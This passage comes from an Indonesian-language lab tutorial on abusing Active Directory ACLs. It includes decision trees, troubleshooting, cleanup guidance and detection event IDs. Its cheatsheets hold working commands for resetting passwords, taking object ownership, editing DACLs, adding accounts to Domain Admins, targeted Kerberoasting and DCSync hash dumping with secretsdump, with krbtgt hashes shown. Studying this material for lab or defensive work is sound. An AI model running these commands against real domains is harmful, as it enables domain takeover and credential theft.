[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8846c6f...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2f3a9c...
```

Untuk dokumentasi lab, fokus pada field:

```
username
RID
LM hash
NT hash
```

### e) Apa dilakukan setelah mendapatkan hash?

Secara konseptual:

```
DCSync
  │
  ▼
NTLM hashes
  │
  ├── Pass-the-Hash
  │
  └── krbtgt hash
         │
         ▼
      Kerberos abuse
```

Untuk latihan tingkat lanjut, `krbtgt` hash dapat menjadi bagian dari Golden Ticket attack chain.

### f) Decision tree

```
[DCSync rights]
      │
      ▼
[Domain object confirmed?]
      │
   ┌──┴──┐
  YES    NO
   │      │
   ▼      ▼
DCSync   Check rights/object
   │
   ▼
Dump selected account first
   │
   ▼
Validate result
   │
   ▼
Next privilege path
```

---

## 3.9 🧾 WriteAccountRestrictions

### Apa artinya?

`WriteAccountRestrictions` adalah permission yang berhubungan dengan property/restriction tertentu pada account object.

Jangan langsung menyimpulkan bahwa rights ini identik dengan:

```
GenericWrite
```

atau:

```
FullControl
```

Impact harus diverifikasi terhadap:

```
Object
+
Attribute
+
Security descriptor
+
Delegation model
```

### Cara berpikir

```
WriteAccountRestrictions
        │
        ▼
Atribut apa yang benar-benar writable?
        │
        ▼
Apakah ada security impact?
        │
        ├── No → dokumentasikan, cari edge lain
        │
        └── Yes → validasi di lab
```

---

## 3.10 🪪 Self / AddSelf

### Apa artinya?

`Self`/`AddSelf` sering muncul dalam konteks delegated membership atau permission tertentu yang memungkinkan principal melakukan aksi atas dirinya sendiri.

Yang harus dicari bukan hanya:

```
"Apakah ada Self?"
```

Tetapi:

```
Self terhadap object apa?
Aksi apa yang diizinkan?
Apakah hasilnya membuat account memperoleh membership/privilege?
```

### Model sederhana

```
[Our Account]
      │
      │ AddSelf
      ▼
[Target Group]
      │
      ▼
[Our Account becomes member]
      │
      ▼
[Inherited privilege]
```

### Decision tree

```
[Self/AddSelf]
      │
      ▼
[Target group/object?]
      │
      ├── Tidak menarik → cari edge lain
      │
      └── Menarik
           │
           ▼
      Validate membership
           │
           ▼
       Refresh session
```

---

# 🔗 BAGIAN 4 — CHAINING ACL ABUSE

## 4.1 🧠 Konsep Chaining

Kesalahan besar dalam ACL hunting:

> “Saya menemukan satu ACE, berarti saya sudah selesai.”

Sering kali single ACE hanya memberikan **satu kemampuan**.

Kemampuan tersebut menghasilkan access baru.

Access baru menghasilkan object baru.

Object baru memiliki edge baru.

Jadi attack graph dapat terlihat seperti:

```
Account A
   │
   │ ACE #1
   ▼
Object B
   │
   │ ACE #2
   ▼
Group C
   │
   │ membership
   ▼
Privilege D
   │
   ▼
High Value Target
```

---

## 4.2 🩸 BloodHound — Identifikasi Chain

### Shortest Path

Gunakan:

```
Find Shortest Path to Domain Admin
```

atau:

```
Find Shortest Path to High Value Targets
```

### Contoh konseptual Cypher

```
# Cari shortest path dari account ke Domain Admins.
# Relationship yang tersedia dapat berbeda antar versi BloodHound.
MATCH p=shortestPath(
  (u:User {name:"SVC_SQL@CORP.LOCAL"})-
  [r:GenericAll|GenericWrite|WriteOwner|WriteDACL|
   ForceChangePassword|AddMember|Owns|Contains*1..]-
  (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p
```

### Cara membacanya

```
[SVC_SQL]
    │
    │ GenericWrite
    ▼
[alice]
    │
    │ AddMember
    ▼
[Backup Operators]
    │
    │ privilege
    ▼
[Next Pivot]
```

---

## 4.3 🧱 Contoh Chain Lengkap

### Scenario

Kita mendapatkan:

```
svc_web credentials
```

BloodHound:

```
svc_web
   │
   │ GenericWrite
   ▼
alice
   │
   │ AddMember
   ▼
Backup Operators
```

Dan group tersebut memiliki privilege yang relevan pada lab.

### Step 1 — Abuse GenericWrite

```
svc_web
   │
   ▼
GenericWrite → alice
```

Tujuan:

```
Mendapatkan kontrol terhadap alice
```

Contoh path yang mungkin adalah mengubah attribute yang relevan lalu melakukan workflow credential attack.

---

### Step 2 — Mendapatkan credential alice

```
alice
   │
   ▼
Kerberoasting / AS-REP-related credential path
   │
   ▼
Crack / recover credential
```

---

### Step 3 — Login sebagai alice

```
svc_web
   │
   ▼
alice credential
   │
   ▼
Authenticated as alice
```

---

### Step 4 — Abuse AddMember

```
alice
   │
   │ AddMember
   ▼
Backup Operators
```

Contoh:

```
# Tambahkan alice/current account ke group target
Add-DomainGroupMember `
  -Identity "Backup Operators" `
  -Members $USERNAME
```

atau sesuai account yang sedang digunakan.

---

### Step 5 — Re-enumerate

Jangan langsung mengasumsikan:

```
Backup Operators = Domain Admin
```

Lakukan:

```
[New Membership]
       │
       ▼
[Refresh Session]
       │
       ▼
[Enumerate effective privileges]
       │
       ▼
[Find next edge]
```

---

## 4.4 🔄 Pola Umum Multi-Hop

```
CREDENTIAL
    │
    ▼
ACL EDGE
    │
    ▼
OBJECT CONTROL
    │
    ▼
NEW CREDENTIAL / MEMBERSHIP / COMPUTER CONTROL
    │
    ▼
RE-ENUMERATION
    │
    ▼
NEW ACL EDGE
    │
    ▼
PRIVILEGE ESCALATION
```

### Aturan praktis

Setiap kali privilege berubah:

```
STOP
 ↓
RE-ENUM
 ↓
REBUILD GRAPH
 ↓
CONTINUE
```

Ini lebih baik daripada terus menjalankan command dari asumsi lama.

---

# 🧹 BAGIAN 5 — CLEANUP & OPSEC

## 5.1 🧼 Kenapa Cleanup Penting?

### Dalam CTF/Lab

Cleanup membantu:

```
- menjaga state machine
- mengulang challenge
- memahami exactly what changed
- membedakan original state vs modified state
```

### Dalam real engagement

Cleanup berkaitan dengan:

```
- Rules of Engagement
- minimizing impact
- returning environment to agreed state
- evidence preservation
- client safety
```

Jangan menghapus evidence yang justru harus dipertahankan oleh assessment rules.

---

## 5.2 🛠️ Cleanup Setiap Abuse

### Hapus SPN yang ditambahkan

```
# Hapus SPN yang ditambahkan pada target
Set-DomainObject -Identity alice `
  -Clear serviceprincipalname
```

### Hapus membership

```
# Keluarkan account dari group target
Remove-DomainGroupMember `
  -Identity "IT Admins" `
  -Members $USERNAME
```

### Kembalikan owner

```
# Contoh mengembalikan ownership ke principal yang ditentukan
Set-DomainObjectOwner `
  -Identity alice `
  -OwnerIdentity "Domain Admins"
```

> Verifikasi owner asli terlebih dahulu sebelum restoration. Jangan berasumsi `Domain Admins` selalu owner awal.

### Hapus ACE tambahan

```
# Hapus FullControl/ACE yang sebelumnya ditambahkan
Remove-DomainObjectAcl `
  -TargetIdentity alice `
  -PrincipalIdentity $USERNAME `
  -Rights All
```

### 🧠 Cleanup principle

```
[Discovery]
   │
   ▼
[Record original state]
   │
   ▼
[Modify]
   │
   ▼
[Test]
   │
   ▼
[Record modified state]
   │
   ▼
[Restore]
   │
   ▼
[Verify]
```

---

## 5.3 🕵️ OPSEC Considerations

> OPSEC di sini berarti memahami konsekuensi perubahan, bukan menjanjikan bahwa aktivitas tersebut “tidak akan terlihat”.

### Password reset

```
Reset password
   ↓
User mungkin gagal login
   ↓
Helpdesk/admin bisa mengetahui
```

### Group membership

```
Add member
   ↓
Audit trail dapat terbentuk
   ↓
SOC/admin dapat meninjau perubahan
```

### DACL abuse

```
WriteDACL
   ↓
Security descriptor berubah
   ↓
Perubahan dapat diaudit
```

### Event IDs yang relevan

Event yang umum dipakai untuk mendeteksi perubahan tertentu mencakup:

```
4728 — member added to security-enabled global group
4732 — member added to security-enabled local group
4756 — member added to security-enabled universal group
5136 — directory service object modified
```

> Event ID yang benar-benar muncul bergantung pada object type, auditing policy, Windows version, dan konfigurasi domain.

### Prinsip OPSEC yang benar

```
Tidak ada aksi tanpa alasan
        │
        ▼
Minimalkan perubahan
        │
        ▼
Catat perubahan
        │
        ▼
Pulihkan state bila diwajibkan
        │
        ▼
Verifikasi cleanup
```

---

# 🌳 BAGIAN 6 — MASTER DECISION TREE

## 6.1 🧭 Decision Tree Utama

```
[DAPAT CREDENTIALS BARU]
           │
           ▼
[VALIDATE IDENTITAS]
           │
           ▼
[CEK BLOODHOUND / ACL]
           │
           ▼
[ADA OUTBOUND CONTROL?]
       ┌───┴────┐
       │        │
      YES       NO
       │        │
       ▼        ▼
 [LIHAT EDGE] [CARI PATH LAIN]
       │
       ▼
[IDENTIFY ACE + TARGET]
       │
       ├─────────────────────────────────────┐
       │                                     │
       ▼                                     ▼
[GenericAll]                           [GenericWrite]
       │                                     │
   ┌───┼────┐                           ┌────┼────┐
   │   │    │                           │    │    │
 User Group Computer                  User Group Computer
   │   │    │                           │    │    │
   ▼   ▼    ▼                           ▼    ▼    ▼
reset add  delegation                  attrs add delegation
pass  member                            /SPN member
       │
       ▼
[WriteOwner]
       │
       ▼
[Ubah owner]
       │
       ▼
[Tambah DACL]
       │
       ▼
[Abuse new control]
       │
       ▼
[WriteDACL]
       │
       ▼
[Tambah ACE]
       │
       ├── FullControl → takeover
       ├── Password control → reset
       └── Replication → DCSync
       │
       ▼
[ForceChangePassword]
       │
       ▼
[Reset password]
       │
       ▼
[Login / enumerate]
       │
       ▼
[AddMember]
       │
       ▼
[Add self to interesting group]
       │
       ▼
[Refresh token]
       │
       ▼
[Re-enumerate]
       │
       ▼
[AllExtendedRights]
       │
       ├── LAPS-related → read managed local admin password
       └── password-related → validate exact extended right
       │
       ▼
[DCSync]
       │
       ▼
[Replication rights confirmed]
       │
       ▼
[secretsdump]
       │
       ▼
[credential material]
       │
       ├── PTH
       └── krbtgt → advanced Kerberos abuse
       │
       ▼
[RE-ENUMERATE]
       │
       ▼
[NEXT HOP]
```

---

## 6.2 🗺️ Decision Tree Ringkas yang Bisa Dibaca Tanpa Penjelasan

```
[Credentials]
      │
      ▼
[BloodHound]
      │
      ▼
[Outbound Edge?]
  ┌───┴────┐
  │        │
 YES       NO
  │        │
  ▼        ▼
[Read Edge] [Other path]
  │
  ├── GenericAll
  │     ├── User     → reset password / attribute abuse
  │     ├── Group    → add member
  │     └── Computer → delegation/RBCD path
  │
  ├── GenericWrite
  │     ├── User     → attribute/SPN abuse
  │     ├── Group    → membership path
  │     └── Computer → delegation path
  │
  ├── WriteOwner
  │     → become owner → modify DACL → exploit
  │
  ├── WriteDACL
  │     → add ACE → exploit
  │
  ├── ForceChangePassword
  │     → reset password
  │
  ├── AddMember / AddSelf
  │     → join interesting group
  │
  ├── AllExtendedRights
  │     → identify exact extended right
  │     → validate LAPS/password impact
  │
  └── DCSync rights
        → replication query
        → secretsdump
        → hash-based next step
```

---

# 🧯 BAGIAN 7 — COMMON ERRORS & TROUBLESHOOTING

> Gunakan troubleshooting secara sistematis:
> 
> ```
> ERROR
>   ↓
> Identify layer
>   ↓
> Authentication?
> LDAP?
> SMB?
> Permission?
> Tool version?
> Object DN?
>   ↓
> Fix one variable
>   ↓
> Retry
> ```

---

## 7.1 ❌ `impacket-dacledit: command not found`

**PENYEBAB:**

- Impacket belum terinstall.
    
- PATH tidak menunjuk ke Python environment yang benar.
    
- Versi/package lama belum menyediakan entrypoint tersebut.
    

**SOLUSI:**

```
# Cek apakah module Impacket tersedia
python3 -m pip show impacket
```

```
# Upgrade Impacket pada environment yang digunakan
python3 -m pip install --upgrade impacket
```

```
# Cek entrypoint
which impacket-dacledit
impacket-dacledit --help
```

Bila executable tidak masuk PATH:

```
# Cari install location untuk membantu diagnosis
python3 -m site
```

---

## 7.2 ❌ Permission denied saat reset password

**PENYEBAB:**

- ACE tidak memberikan password-control right.
    
- Target dilindungi policy tertentu.
    
- Anda salah membaca edge.
    
- Anda sebenarnya memiliki WriteProperty pada attribute lain, bukan password reset.
    

**SOLUSI:**

```
# Verifikasi ACL target
impacket-dacledit -action read \
  -target alice \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

Checklist:

```
[ ] Target benar?
[ ] Principal benar?
[ ] ACE benar?
[ ] ForceChangePassword ada?
[ ] GenericAll benar-benar terhadap target?
[ ] DACL sudah berubah?
```

---

## 7.3 ❌ `The object class 'user' is invalid`

**PENYEBAB:**

- Target DN salah.
    
- Anda memasukkan nama class di tempat DN/identity.
    
- DN tidak menunjuk object yang benar.
    

**SOLUSI:**

```
# Cari DN target melalui LDAP
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=corp,DC=local" \
  "(sAMAccountName=alice)" \
  distinguishedName
```

Expected pattern:

```
distinguishedName:
CN=alice,CN=Users,DC=corp,DC=local
```

---

## 7.4 ❌ WriteDACL berhasil tapi reset password tetap gagal

**PENYEBAB:**

WriteDACL sendiri bukan reset password.

Logikanya:

```
WriteDACL
   ↓
Boleh mengubah DACL
   ↓
Tambahkan ACE yang tepat
   ↓
Baru gunakan ACE tersebut
```

**SOLUSI:**

```
1. Pastikan ACE baru benar-benar tertulis.
2. Pastikan principal benar.
3. Pastikan object target benar.
4. Pastikan right yang ditambahkan memang mendukung operasi.
```

Verifikasi:

```
# Read back ACL setelah perubahan
impacket-dacledit -action read \
  -target alice \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

---

## 7.5 ❌ BloodHound tidak menampilkan edge ACL

**PENYEBAB:**

- Collector tidak mengambil ACL relationship.
    
- Data lama.
    
- Collector/version mismatch.
    
- Node/relationship filter belum sesuai.
    

**SOLUSI:**

```
1. Pastikan ACL collection dilakukan.
2. Jalankan kembali collection.
3. Import hasil baru.
4. Refresh analysis.
```

Contoh collection:

```
# Contoh collector NetExec.
# Opsi collection berbeda antar versi.
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD \
  --bloodhound -ns $DC_IP -c All
```

---

## 7.6 ❌ `Set-DomainObject` gagal di PowerShell

**PENYEBAB:**

- PowerView belum loaded.
    
- Function tidak tersedia di session.
    
- RSAT/AD module tidak tersedia untuk native cmdlet.
    
- Identity salah.
    

**SOLUSI:**

```
# Load PowerView
. .\PowerView.ps1
```

```
# Cek function
Get-Command Set-DomainObject
```

Native AD module:

```
# Cek cmdlet ActiveDirectory
Get-Command Set-ADUser
```

---

## 7.7 ❌ ForceChangePassword gagal

**PENYEBAB:**

- Password baru tidak memenuhi complexity policy.
    
- ACE salah.
    
- Target bukan object yang memiliki permission tersebut.
    
- Operation tidak sesuai dengan delegation yang tersedia.
    

**SOLUSI:**

Gunakan password lab yang memenuhi complexity:

```
# Contoh password lab yang memenuhi variasi karakter
$NewPassword = ConvertTo-SecureString `
  'Lab-ACL-2026!Password' `
  -AsPlainText -Force
```

Kemudian verifikasi ACL kembali.

---

## 7.8 ❌ AddMember berhasil tapi tidak dapat akses

**PENYEBAB:**

Membership berubah di directory tetapi access token/session lama belum mencerminkan group baru.

**SOLUSI:**

```
1. Verifikasi membership.
2. Logoff/logon.
3. Buat session baru.
4. Cek token/group membership lagi.
```

PowerShell:

```
# Verifikasi group membership domain
Get-DomainGroupMember -Identity "IT Support"
```

---

## 7.9 ❌ DCSync gagal meskipun terlihat punya rights

**PENYEBAB:**

- Rights belum terpasang benar.
    
- Wrong domain object.
    
- ACL replication privileges tidak lengkap.
    
- Koneksi ke DC bermasalah.
    
- Firewall/network policy.
    
- Authentication context salah.
    
- Tool/version mismatch.
    

**SOLUSI:**

```
# Baca kembali domain ACL
impacket-dacledit -action read \
  -target-dn "DC=corp,DC=local" \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"
```

Kemudian:

```
# Uji kembali dengan target user spesifik
impacket-secretsdump \
  "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
  -just-dc-user Administrator
```

---

## 7.10 ❌ `net rpc` gagal

**PENYEBAB:**

- SMB connection gagal.
    
- Authentication format salah.
    
- SMB signing/policy.
    
- Versi Samba/client mismatch.
    
- DC bukan endpoint yang tepat untuk operation tersebut.
    

**SOLUSI:**

```
# Tes SMB dasar
smbclient -L //$DC_IP/ -U "$DOMAIN/$USERNAME"
```

```
# Pastikan syntax net tersedia
net --help
net rpc --help
```

Kemudian validasi credentials/domain terlebih dahulu.

---

## 7.11 ❌ `impacket-owneredit` tidak menemukan target

**PENYEBAB:**

- Identity tidak unik.
    
- Target perlu DN.
    
- SPN/domain resolution bermasalah.
    
- Tool version berbeda.
    

**SOLUSI:**

```
# Cari DN target terlebih dahulu
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=corp,DC=local" \
  "(sAMAccountName=alice)" \
  distinguishedName
```

Kemudian gunakan identity/DN yang sesuai tool.

---

## 7.12 ❌ LAPS query menghasilkan kosong

**PENYEBAB:**

- Target tidak memakai LAPS.
    
- Attribute schema yang dicari adalah legacy, sedangkan environment memakai Windows LAPS.
    
- Account tidak punya read permission.
    
- Computer tidak memiliki password yang tersimpan/tersinkron sesuai kondisi.
    

**SOLUSI:**

```
1. Identifikasi jenis LAPS.
2. Enumerate computer objects.
3. Cari schema/attribute yang sesuai.
4. Verifikasi effective permission.
```

---

# ⚡ BAGIAN 8 — QUICK REFERENCE CHEATSHEET

## 8.1 🐧 ACL ABUSE CHEATSHEET — DARI LINUX

```
# ============================================
# ACL ABUSE CHEATSHEET — DARI LINUX
# ============================================

export DOMAIN="corp.local"
export DC_IP="10.10.10.100"
export USERNAME="svc_sql"
export PASSWORD="LabPassword123!"
export TARGET_USER="alice"
export TARGET_GROUP="Domain Admins"

# ============================================
# ENUM ACL
# ============================================

# Baca ACL target user
impacket-dacledit -action read \
  -target $TARGET_USER \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"

# Baca ACL domain object
impacket-dacledit -action read \
  -target-dn "DC=corp,DC=local" \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"

# ============================================
# GENERICALL / FORCECHANGEPASSWORD
# ============================================

# Reset password target bila delegated rights mendukung
net rpc password $TARGET_USER "NewPass123!" \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP

# ============================================
# WRITEOWNER
# ============================================

# Ubah owner target
impacket-owneredit -action write \
  -new-owner $USERNAME \
  -target $TARGET_USER \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"

# ============================================
# WRITEDACL
# ============================================

# Tambahkan FullControl ke account kita
impacket-dacledit -action write \
  -rights FullControl \
  -principal $USERNAME \
  -target $TARGET_USER \
  -dc-ip $DC_IP \
  "$DOMAIN/$USERNAME:$PASSWORD"

# ============================================
# ADDMEMBER
# ============================================

# Tambahkan diri ke group target
net rpc group addmem "$TARGET_GROUP" $USERNAME \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP

# ============================================
# DCSYNC
# ============================================

# Dump replication data dari DC
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
  -just-dc

# Dump satu user
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
  -just-dc-user Administrator
```

---

## 8.2 🪟 ACL ABUSE CHEATSHEET — DARI WINDOWS

```
# ============================================
# ACL ABUSE CHEATSHEET — DARI WINDOWS
# ============================================

# IMPORT POWERVIEW
. .\PowerView.ps1

# ============================================
# ENUM ACL
# ============================================

Get-DomainObjectAcl -Identity $TargetUser -ResolveGUIDs |
  Where-Object {
    $_.ActiveDirectoryRights -match
    "GenericAll|GenericWrite|WriteOwner|WriteDACL|ForceChangePassword"
  }

# ============================================
# RESET PASSWORD
# ============================================

$pass = ConvertTo-SecureString `
  'NewPass123!' `
  -AsPlainText -Force

Set-DomainUserPassword `
  -Identity $TargetUser `
  -AccountPassword $pass

# ============================================
# GROUP MEMBERSHIP
# ============================================

Add-DomainGroupMember `
  -Identity $TargetGroup `
  -Members $env:USERNAME

# ============================================
# TARGETED KERBEROAST
# ============================================

Set-DomainObject `
  -Identity $TargetUser `
  -Set @{serviceprincipalname='http/fake'}

Get-DomainSPNTicket -SPN "http/fake"

# ============================================
# WRITEOWNER → WRITEDACL
# ============================================

Set-DomainObjectOwner `
  -Identity $TargetUser `
  -OwnerIdentity $env:USERNAME

Add-DomainObjectAcl `
  -TargetIdentity $TargetUser `
  -PrincipalIdentity $env:USERNAME `
  -Rights All
```

---

## 8.3 📋 ACE → TARGET → NEXT STEP

|ACE|Target|Typical next analysis|
|---|---|---|
|GenericAll|User|takeover, attribute abuse, credential path|
|GenericAll|Group|add member|
|GenericAll|Computer|delegation/RBCD|
|GenericWrite|User|inspect writable attributes/SPN|
|GenericWrite|Group|membership/control path|
|GenericWrite|Computer|computer-object/delegation path|
|WriteOwner|Any relevant object|ownership → DACL control|
|WriteDACL|Any relevant object|add appropriate ACE|
|ForceChangePassword|User|reset password|
|AddMember|Group|join group → inherit rights|
|AllExtendedRights|Computer/User|identify exact extended right|
|ReadLAPSPassword|Computer|read managed local admin credential|
|DCSync rights|Domain|replication → credential material|
|Self/AddSelf|Group/Object|inspect self-scoped delegated control|

---

# 🧠 BAGIAN 9 — MASTER MINDSET UNTUK PEMULA

## 9.1 Jangan Hafal Command, Hafal Primitive

Tujuan muscle memory bukan:

```
"hafal 50 command"
```

Tujuan sebenarnya:

```
lihat edge
   ↓
kenali primitive
   ↓
kenali target
   ↓
pilih abuse
   ↓
verifikasi
   ↓
re-enumerate
```

---

## 9.2 Primitive Mental Model

```
CONTROL
  │
  ├── Change Password
  │
  ├── Change Attributes
  │
  ├── Change Ownership
  │
  ├── Change DACL
  │
  ├── Change Group Membership
  │
  ├── Read Sensitive Credential
  │
  └── Replicate Secrets
```

ACL hanya cara mendapatkan salah satu primitive di atas.

---

## 9.3 Checklist Setiap Menemukan ACE

```
[ ] Siapa principal-nya?
[ ] Apakah itu account kita / group kita?
[ ] Target object apa?
[ ] ACE apa?
[ ] ObjectAceType apa?
[ ] Apa control yang benar-benar diberikan?
[ ] Apakah target high-value?
[ ] Bisa langsung dieksploitasi?
[ ] Perlu chaining?
[ ] Setelah exploit, credential/privilege apa yang baru?
[ ] Harus re-enumerate?
[ ] Perlu cleanup?
```

---

# 🧪 BAGIAN 10 — CONTOH WORKFLOW END-TO-END

## Scenario

Dari file 37 kita mendapatkan:

```
Username: svc_web
Password: <recovered credential>
Domain: corp.local
DC: 10.10.10.100
```

### Step 1 — Validasi credential

```
# Tes akses LDAP
nxc ldap $DC_IP \
  -u $USERNAME \
  -p $PASSWORD
```

### Step 2 — Enumerate ACL graph

```
# Collect BloodHound-compatible data
nxc ldap $DC_IP \
  -u $USERNAME \
  -p $PASSWORD \
  --bloodhound -ns $DC_IP -c All
```

### Step 3 — Cari outbound control

Mental model:

```
svc_web
   │
   ├── GenericWrite → alice
   ├── ReadLAPSPassword → WKSTN01
   └── AddMember → IT Support
```

### Step 4 — Prioritaskan

Jangan otomatis memilih edge pertama.

Urutkan:

```
DCSync
  ↓
High-value group control
  ↓
High-value user control
  ↓
LAPS credential
  ↓
Computer/delegation path
  ↓
Lower-value group/user
```

Tetap evaluasi berdasarkan kondisi nyata graph.

### Step 5 — Exploit satu edge

Misalnya:

```
svc_web
   │
   │ GenericWrite
   ▼
alice
```

### Step 6 — Validasi

```
[Exploit]
   │
   ▼
[Berhasil?]
   │
 ┌─┴─┐
NO   YES
│     │
▼     ▼
Debug  Re-enumerate as new context
```

### Step 7 — Re-enumerate

```
alice
   │
   ├── group membership
   ├── outbound ACL
   ├── sessions
   ├── SPNs
   └── privileged edges
```

### Step 8 — Continue chaining

```
svc_web
  │
  │ GenericWrite
  ▼
alice
  │
  │ AddMember
  ▼
IT Support
  │
  ▼
Next privilege
```

### Step 9 — Cleanup

```
[All changes]
     │
     ▼
[Restore state]
     │
     ▼
[Verify]
```

---

# 🚦 BAGIAN 11 — PRIORITIZATION MATRIX

## 11.1 Prioritas ACL Hunting

|Kondisi|Prioritas|
|---|---|
|DCSync rights pada domain|🔴 P0|
|Control terhadap Domain Admins / high-value group|🔴 P0|
|GenericAll terhadap privileged user|🔴 P0|
|ReadLAPSPassword ke server penting|🔴 P0|
|GenericAll terhadap computer penting|🔴 P1|
|WriteDACL terhadap privileged object|🔴 P1|
|WriteOwner terhadap privileged object|🔴 P1|
|ForceChangePassword pada privileged user|🔴 P1|
|GenericWrite terhadap privileged user|🟠 P1|
|AddMember ke group sensitif|🟠 P1|
|GenericWrite terhadap low-value object|🟡 P2|
|Rights ke object yang tidak mengarah ke privilege|🟢 P3|

---

# 🔬 BAGIAN 12 — VALIDATION CHECKLIST

## Sebelum Exploit

```
[ ] Saya tahu account yang saya gunakan
[ ] Saya tahu domain
[ ] Saya tahu DC
[ ] Saya tahu target object
[ ] Saya tahu principal yang punya ACE
[ ] Saya tahu ACE/right yang diberikan
[ ] Saya tahu expected impact
```

## Saat Exploit

```
[ ] Gunakan satu perubahan pada satu waktu
[ ] Catat command
[ ] Catat output
[ ] Validasi hasil
[ ] Jangan mengasumsikan keberhasilan
```

## Setelah Exploit

```
[ ] Re-enumerate
[ ] Cek credential/context baru
[ ] Cek outbound ACL baru
[ ] Cek group membership
[ ] Cek high-value target
[ ] Catat perubahan
[ ] Cleanup sesuai requirement
```

---

# 🧭 BAGIAN 13 — “KALAU MENEMUKAN INI, LAKUKAN APA?”

```
MENEMUKAN GenericAll
        │
        ▼
Lihat TARGET
        │
        ├── USER
        │     ├── password control?
        │     └── writable attributes?
        │
        ├── GROUP
        │     └── add member?
        │
        └── COMPUTER
              └── delegation/RBCD?

MENEMUKAN GenericWrite
        │
        ▼
Cari ATTRIBUTE yang writable
        │
        ├── SPN?
        ├── account restriction?
        ├── script-related attribute?
        └── membership/control path?

MENEMUKAN WriteOwner
        │
        ▼
Ownership
        │
        ▼
DACL control
        │
        ▼
New ACE

MENEMUKAN WriteDACL
        │
        ▼
Tambahkan ACE yang paling relevan
        │
        ▼
Exploit

MENEMUKAN ForceChangePassword
        │
        ▼
Reset password
        │
        ▼
Login
        │
        ▼
Re-enum

MENEMUKAN AddMember/AddSelf
        │
        ▼
Join group
        │
        ▼
Refresh token
        │
        ▼
Re-enum

MENEMUKAN ReadLAPSPassword
        │
        ▼
Identify computer
        │
        ▼
Validate LAPS type + effective permission
        │
        ▼
Use credential in allowed lab scenario

MENEMUKAN DCSync
        │
        ▼
Confirm domain object + replication rights
        │
        ▼
secretsdump
        │
        ▼
Credential material
        │
        ▼
Re-enum / next stage
```

---

# 🧹 BAGIAN 14 — CLEANUP CHECKLIST

```
[ ] SPN yang ditambahkan sudah dihapus
[ ] Group membership tambahan sudah dihapus
[ ] Owner sudah dikembalikan ke state semula
[ ] ACE tambahan sudah dihapus
[ ] Password target dipulihkan bila assessment mengharuskan
[ ] ScriptPath/attribute yang diubah sudah dikembalikan
[ ] Tidak ada temporary account/object tambahan
[ ] Bukti perubahan didokumentasikan
[ ] State akhir diverifikasi
```

---

# 📦 BAGIAN 15 — TOOL INSTALLATION DI PARROT OS

> **Catatan:** package manager dan Python environment dapat berbeda. Pada Parrot OS, gunakan environment yang sesuai dan cek versi tool setelah instalasi.

## 15.1 🩸 BloodyAD

```
# Install bloodyAD dari PyPI
python3 -m pip install bloodyAD
```

Alternatif:

```
# Clone repository
git clone https://github.com/CravateRouge/bloodyAD

# Masuk ke directory
cd bloodyAD

# Install package
python3 -m pip install .
```

Verifikasi:

```
# Pastikan executable tersedia
bloodyAD --help
```

---

## 15.2 🔥 Impacket

```
# Upgrade Impacket
python3 -m pip install --upgrade impacket
```

Alternatif repository:

```
# Clone Impacket
git clone https://github.com/fortra/impacket

# Masuk ke project
cd impacket

# Install package
python3 -m pip install .
```

Verifikasi:

```
# Cek tools utama
impacket-dacledit --help
impacket-owneredit --help
impacket-secretsdump --help
```

---

## 15.3 🪟 PowerView

```
# Buat folder tooling Windows
mkdir -p /opt/windows-tools/
```

```
# Download PowerView ke folder tooling
# URL/repository dapat berubah; gunakan source resmi/terpercaya
# yang sesuai lab.
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 \
  -O /opt/windows-tools/PowerView.ps1
```

Verifikasi file:

```
# Pastikan file ada
ls -lh /opt/windows-tools/PowerView.ps1
```

---

## 15.4 🛠️ NetExec

```
# Install/update NetExec sesuai environment
python3 -m pip install --upgrade netexec
```

Verifikasi:

```
# Cek command
nxc --help
```

---

## 15.5 🔎 LDAP Tools

```
# Cek ldapsearch
which ldapsearch
ldapsearch --help
```

Jika belum tersedia, install package OpenLDAP client sesuai distro:

```
# Pada Debian/Parrot-based systems
sudo apt update
sudo apt install ldap-utils
```

---

## 15.6 ✅ CEK SEMUA TOOLS

```
# ============================================
# TOOL AVAILABILITY CHECK
# ============================================

which impacket-dacledit && echo "dacledit: OK"

which impacket-owneredit && echo "owneredit: OK"

which impacket-secretsdump && echo "secretsdump: OK"

which nxc && echo "NetExec: OK"

which ldapsearch && echo "ldapsearch: OK"

which net && echo "net rpc client: OK"
```

---

# 🧠 BAGIAN 16 — SELF-QUIZ UNTUK MUSCLE MEMORY

## Pertanyaan 1

```
Saya punya GenericAll terhadap user alice.
Apa pertanyaan pertama?
```

Jawaban mental:

```
"Apa impact GenericAll terhadap USER?"
```

---

## Pertanyaan 2

```
Saya punya WriteOwner terhadap alice.
Apakah saya otomatis mempunyai FullControl?
```

Jawaban:

```
Tidak langsung.
```

Flow:

```
WriteOwner
   ↓
Ownership
   ↓
DACL manipulation
   ↓
Required ACE
   ↓
Control
```

---

## Pertanyaan 3

```
Saya punya WriteDACL terhadap domain.
Apa hal berbahaya yang perlu dicek?
```

Jawaban:

```
Replication/DCSync rights
```

---

## Pertanyaan 4

```
Saya punya AddMember ke IT Support.
Apa yang harus saya lakukan setelah membership berubah?
```

Jawaban:

```
Refresh authentication context
dan re-enumerate privilege.
```

---

## Pertanyaan 5

```
Saya punya GenericWrite ke computer.
Apakah langsung berarti RBCD berhasil?
```

Jawaban:

```
